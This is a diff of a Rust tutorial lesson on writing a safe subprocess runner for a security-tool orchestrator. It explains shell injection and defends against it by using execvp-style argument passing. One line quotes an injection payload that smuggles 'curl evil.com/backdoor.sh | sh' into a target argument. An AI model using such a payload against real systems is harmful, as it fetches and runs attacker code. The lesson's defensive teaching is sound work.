@@ -6,14 +6,16 @@
 
 > [!IMPORTANT]
 > Every tool node in Achilles does exactly this: **run a command, capture its output, check for failure.**
-> This is the most security-critical code you will write. A single mistake here — passing arguments through a shell — turns your orchestration engine into a remote code execution vector.
+> This is the most security-critical code you will write. A single mistake here — passing arguments through a shell — turns your orchestration engine into a remote 
+> code execution vector.
 > No Rustlings today. You write real systems code from scratch.
 
 ---
 
 ## Why This Day Matters
 
-Every security tool Achilles orchestrates — `nmap`, `subfinder`, `httpx`, `nuclei`, `ffuf`, `sqlmap` — is an external binary. Achilles doesn't reimplement their scanning logic. It **spawns them as child processes**, feeds them arguments, captures their output, and pipes that output to the next node in the DAG.
+Every security tool Achilles orchestrates — `nmap`, `subfinder`, `httpx`, `nuclei`, `ffuf`, `sqlmap` — is an external binary. Achilles doesn't reimplement their scanning
+logic. It **spawns them as child processes**, feeds them arguments, captures their output, and pipes that output to the next node in the DAG.
 
 The subprocess runner is the foundation of the entire executor layer. If this is broken:
 - Shell injection lets attackers execute arbitrary commands through crafted workflow inputs.
@@ -21,7 +23,8 @@ The subprocess runner is the foundation of the entire executor layer. If this is
 - Uncaptured stderr means silent failures — a tool crashes but Achilles thinks it succeeded.
 - Missing exit code checks mean Achilles treats garbage output as valid scan data.
 
-In C, you'd use `fork()` + `execvp()`. In Python, you'd use `subprocess.run()`. In Rust, you use `std::process::Command` — which wraps `execvp` directly, with no shell involvement by default.
+In C, you'd use `fork()` + `execvp()`. In Python, you'd use `subprocess.run()`. In Rust, you use `std::process::Command` — which wraps `execvp` directly, with no
+shell involvement by default.
 
 ---
 
@@ -130,7 +133,8 @@ Command::new("sh")
     .output()
 ```
 
-The shell parses the string. The `;` terminates the nmap command. Everything after it executes as a separate command. The attacker's payload runs with the privileges of the Achilles process.
+The shell parses the string. The `;` terminates the nmap command. Everything after it executes as a separate command. The attacker's payload runs with the privileges
+of the Achilles process.
 
 ### The Defense
 
@@ -144,7 +148,8 @@ Command::new("nmap")
     .output()
 ```
 
-What happens: `execvp` passes the string `"10.0.0.1; curl evil.com/backdoor.sh | sh"` **literally** as nmap's target argument. nmap tries to resolve that as a hostname, fails DNS lookup, and exits with an error. No code execution. The shell metacharacters `;`, `|`, `$` are just regular characters.
+`What happens: `execvp` passes the string `"10.0.0.1; curl evil.com/backdoor.sh | sh"` **literally** as nmap's target argument. nmap tries to resolve that
+as a hostname, fails DNS lookup, and exits with an error. No code execution. The shell metacharacters `;`, `|`, `$` are just regular characters.
 
 ### Why This Matters in Memory
 
@@ -171,7 +176,8 @@ Every subprocess call in Achilles follows this exact pattern:
 fn run_tool(binary: &str, args: &[&str]) -> Result<ToolOutput, ToolError>
 ```
 
-No `command_line: &str` parameter. No `shell: bool` flag. The API makes it **structurally impossible** to pass a shell command string. This is security by design — the dangerous pattern can't even be expressed.
+No `command_line: &str` parameter. No `shell: bool` flag. The API makes it **structurally impossible** to pass a shell command string. This is security
+by design — the dangerous pattern can't even be expressed.
 
 ---
 
@@ -506,7 +512,8 @@ Achilles uses direct execvp. Shell metacharacters are never interpreted.
 **Run:** `cargo run --bin day3_injection_proof`
 
 > [!NOTE]
-> After writing this exercise, you'll understand viscerally why every subprocess call in Achilles uses `(binary, args)` and never a shell string. This isn't theoretical — you'll see the injection happen live.
+> After writing this exercise, you'll understand viscerally why every subprocess call in Achilles uses `(binary, args)` and never a shell string. 
+> This isn't theoretical — you'll see the injection happen live.
 
 ---
 
@@ -549,18 +556,48 @@ Create `~/Antigravity/Achilles/src/bin/day3_real_tool.rs`.
 
 ## Part 8: Key Concepts to Internalize
 
-| Question | Your Answer Should Include |
-|----------|---------------------------|
-| What does `Command::new("nmap").arg(target).output()` call at the OS level? | `execvp("nmap", ["nmap", target])` — direct syscall, no shell. |
-| What's the difference between `.output()` returning `Err` and returning `Ok` with non-zero exit? | `Err` = binary not found or OS error. `Ok` with non-zero = binary ran but reported failure. |
-| Why must Achilles always set `.stdin(Stdio::null())`? | Tools like `nuclei`/`ffuf` read from stdin if it's open. Without `null()`, they block forever waiting for input. |
-| What does `Stdio::piped()` do? | Creates a pipe between parent and child. Parent can read child's stdout/stderr as bytes. |
-| Why does `String::from_utf8_lossy` return `Cow<str>` instead of `String`? | If bytes are valid UTF-8, it returns a borrowed reference (zero-cost). Only allocates if replacement is needed. |
-| What is shell injection and how does Achilles prevent it? | Attacker embeds shell metacharacters (`;`, `\|`, `` ` ``) in input. Achilles prevents it by never invoking a shell — `execvp` treats all arguments as literal strings. |
-| What's the Achilles subprocess runner API signature? | `fn run_tool(binary: &str, args: &[&str]) -> Result<ToolOutput, ToolError>` — no shell parameter, no command string. |
-| What does `output.status.code()` return and when is it `None`? | Returns `Option<i32>`. It's `None` when the process was killed by a signal (e.g., SIGKILL) rather than exiting normally. |
-| What's the difference between `Stdio::null()`, `Stdio::piped()`, and `Stdio::inherit()`? | `null` = /dev/null (discard), `piped` = create pipe for capture, `inherit` = share parent's terminal stream. |
-| Why does `run_tool` take `args: &[&str]` instead of `command_line: &str`? | Structural prevention of shell injection. The API can't express a shell command — each argument is always separate. |
+**1. What does `Command::new("nmap").arg(target).output()` call at the OS level?**
+`execvp("nmap", ["nmap", target])` — direct syscall, no shell.
+
+**2. `.output()` returning `Err` vs `Ok` with non-zero exit?**
+`Err` = binary not found or OS error.
+`Ok` with non-zero = binary ran but reported failure.
+
+**3. Why must Achilles always set `.stdin(Stdio::null())`?**
+Tools like `nuclei`/`ffuf` read from stdin if it's open.
+Without `null()`, they block forever waiting for input.
+
+**4. What does `Stdio::piped()` do?**
+Creates a pipe between parent and child.
+Parent can read child's stdout/stderr as bytes.
+
+**5. Why does `String::from_utf8_lossy` return `Cow<str>`?**
+If bytes are valid UTF-8, it returns a borrowed reference (zero-cost).
+Only allocates a new String if invalid bytes need replacement.
+
+**6. What is shell injection and how does Achilles prevent it?**
+Attacker embeds shell metacharacters (`;`, `|`, `` ` ``) in input.
+Achilles prevents it by never invoking a shell —
+`execvp` treats all arguments as literal strings.
+
+**7. What's the Achilles subprocess runner API signature?**
+`fn run_tool(binary: &str, args: &[&str]) -> Result<ToolOutput, ToolError>`
+No shell parameter. No command string. Each argument is separate.
+
+**8. What does `output.status.code()` return? When is it `None`?**
+Returns `Option<i32>`.
+`None` when the process was killed by a signal (e.g., SIGKILL)
+rather than exiting normally.
+
+**9. `Stdio::null()` vs `Stdio::piped()` vs `Stdio::inherit()`?**
+`null` = /dev/null (discard).
+`piped` = create pipe for capture.
+`inherit` = share parent's terminal stream.
+
+**10. Why `args: &[&str]` instead of `command_line: &str`?**
+Structural prevention of shell injection.
+The API can't express a shell command —
+each argument is always separate.
 
 ---
 
@@ -580,7 +617,9 @@ Create `~/Antigravity/Achilles/src/bin/day3_real_tool.rs`.
 
 ## Lesson
 
-> The subprocess runner is a **trust boundary**. Everything inside your Rust process is memory-safe, type-checked, borrow-checked. The moment you `Command::new()`, you're handing control to an external binary that can do anything — read files, open sockets, delete data. Your job is to **constrain** that boundary: no shell interpretation, no stdin leaks, no unchecked exit codes, no silently swallowed errors.
+> The subprocess runner is a **trust boundary**. Everything inside your Rust process is memory-safe, type-checked, borrow-checked. The moment you `Command::new()`, 
+> you're handing control to an external binary that can do anything — read files, open sockets, delete data. Your job is to **constrain** that boundary: 
+> no shell interpretation, no stdin leaks, no unchecked exit codes, no silently swallowed errors.
 >
 > Every Achilles tool node is just this pattern: spawn → capture → check → parse. Master it today.
 
